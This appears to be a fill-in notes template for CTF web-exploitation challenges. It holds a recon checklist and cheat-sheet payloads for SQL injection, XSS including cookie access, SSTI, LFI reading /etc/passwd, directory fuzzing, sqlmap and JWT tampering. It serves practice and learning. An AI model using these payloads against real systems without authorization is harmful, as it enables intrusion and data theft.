# 🌐 Web Exploitation — Challenge Notes Template

## Challenge Info
- **Name:** 
- **Points:** 
- **URL:** 
- **Description:** 

---

## Recon Checklist

### Passive (first 5 minutes — don't touch inputs yet)
- [ ] View page source (`Ctrl+U`)
- [ ] Open DevTools → Network tab (reload while watching)
- [ ] Check all JS files for API keys, endpoints, comments
- [ ] Visit `/robots.txt`
- [ ] Visit `/sitemap.xml`
- [ ] Check cookies (DevTools → Application)
- [ ] Check response headers (`curl -I URL`)
- [ ] Try appending `/.git/HEAD` — is git exposed?

### Active Enumeration
- [ ] Fuzz directories: `ffuf -u URL/FUZZ -w /usr/share/wordlists/dirb/common.txt`
- [ ] Check common paths: `/admin`, `/flag`, `/secret`, `/api`, `/backup`, `/.env`
- [ ] Intercept requests with Burp Suite

---

## Common Vulnerabilities to Test

### SQL Injection
```
' OR '1'='1
' OR '1'='1'--
admin'--
' UNION SELECT null,null,null--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```
Automated: `sqlmap -u "URL?param=1" --dbs --batch`

### XSS (Cross-Site Scripting)
```html
<script>alert(1)</script>
<img src=x onerror=alert(document.cookie)>
"><script>alert(1)</script>
```

### SSTI (Server-Side Template Injection)
```
{{7*7}}        → if returns 49, vulnerable
${7*7}
<%= 7*7 %>
#{7*7}
```

### IDOR (Insecure Direct Object Reference)
- Change `?id=1` to `?id=2`, `?id=0`, `?id=-1`
- Change `user_id` in request body
- Base64 decode any opaque IDs first

### LFI (Local File Inclusion)
```
?file=../../../../etc/passwd
?page=../../../etc/passwd%00
?file=php://filter/convert.base64-encode/resource=index.php
```

### JWT Tampering
1. Decode at [jwt.io](https://jwt.io)
2. Try changing `alg` to `none`
3. Try `HS256` with empty/known secret
4. Try `RS256` → `HS256` algorithm confusion

---

## Notes & Progress

```
[Attempt 1] 
[Result]    

[Attempt 2]
[Result]    

[Solution]  
```

---

## Flag
```
CTF{                                    }
```
